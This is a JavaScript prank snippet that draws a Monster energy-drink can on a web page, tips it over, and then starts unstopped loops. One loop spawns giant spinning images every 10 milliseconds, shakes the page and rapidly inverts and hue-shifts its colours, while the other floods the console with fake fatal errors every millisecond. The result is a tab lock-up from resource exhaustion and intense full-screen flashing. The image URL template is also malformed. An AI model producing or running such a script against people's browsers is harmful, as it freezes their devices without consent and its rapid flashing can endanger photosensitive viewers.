(function() {
    // 1. CUSTOM DESIGNED CAN (BLACK & SILVER)
    const can = document.createElement('div');
    can.id = 'monster-can-v2';
    can.innerHTML = `
        <div style="width: 60px; height: 15px; background: #silver; border-radius: 50% 50% 0 0; background: linear-gradient(to bottom, #eee, #999);"></div>
        <div style="width: 60px; height: 110px; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; border-left: 1px solid #333; border-right: 1px solid #333; position: relative;">
            <div style="color: #32cd32; font-family: 'Arial Black'; font-weight: bold; font-size: 40px; filter: drop-shadow(0 0 8px #32cd32); transform: skew(-5deg);">M</div>
            <div style="color: white; font-size: 8px; position: absolute; bottom: 5px; font-family: sans-serif; letter-spacing: 1px;">MONSTER</div>
        </div>
        <div style="width: 60px; height: 15px; background: #silver; border-radius: 0 0 50% 50%; background: linear-gradient(to top, #eee, #999);"></div>
    `;

    Object.assign(can.style, {
        position: 'fixed', top: '40%', left: '50%',
        width: '60px', height: '140px',
        marginLeft: '-30px', zIndex: '2000000',
        transition: 'transform 5s cubic-bezier(0.4, 0, 1, 1)', 
        pointerEvents: 'none', filter: 'drop-shadow(0 0 25px rgba(50, 205, 50, 0.6))'
    });
    document.body.appendChild(can);

    // 2. TRIGGER THE SLOW TIP
    setTimeout(() => {
        can.style.transform = 'rotate(180deg)';

        // 3. THE UPSIDE-DOWN TRIGGER (5 seconds later)
        setTimeout(() => {
            // Flash the can to signal the spill
            can.style.filter = 'drop-shadow(0 0 60px #32cd32) invert(1)';
            
            // --- SILENT HYPER-LOOP START ---
            function spawnMegaImage() {
                const img = new Image();
                const size = Math.floor(Math.random() * 1500) + 1500; 
                img.src = `https://picsum.photos{size}/${size}?random=${Math.random()}`;
                
                img.style.cssText = `
                    position: fixed; top: ${Math.random() * 100}vh; left: ${Math.random() * 100}vw;
                    width: ${size}px; z-index: 999999; pointer-events: none;
                    filter: contrast(2) saturate(3) blur(1px) drop-shadow(0 0 50px red);
                    transition: transform 3s cubic-bezier(0.1, 0, 0.9, 1);
                    transform: translate(-50%, -50%) scale(0.01) rotate(0deg);
                `;

                document.body.appendChild(img);
                requestAnimationFrame(() => {
                    img.style.transform = `translate(-50%, -50%) scale(8) rotate(${Math.random() * 5000}deg)`;
                });
            }

            // CHAOS LOOP
            const chaosInterval = setInterval(() => {
                spawnMegaImage();
                document.body.style.transform = `translate(${(Math.random()-0.5)*300}px, ${(Math.random()-0.5)*300}px) rotate(${(Math.random()-0.5)*10}deg)`;
                document.documentElement.style.filter = `invert(${Math.random() > 0.5 ? 100 : 0}%) hue-rotate(${Math.random() * 360}deg)`;
                document.title = "MONSTER_SYSTEM_KILLER_" + Date.now();
            }, 10);

            // CONSOLE FLOOD
            setInterval(() => console.error("FATAL_ERROR_SPILL_DATA_EXCEEDED_" + Date.now()), 1);

        }, 5000); 
    }, 500);
})();
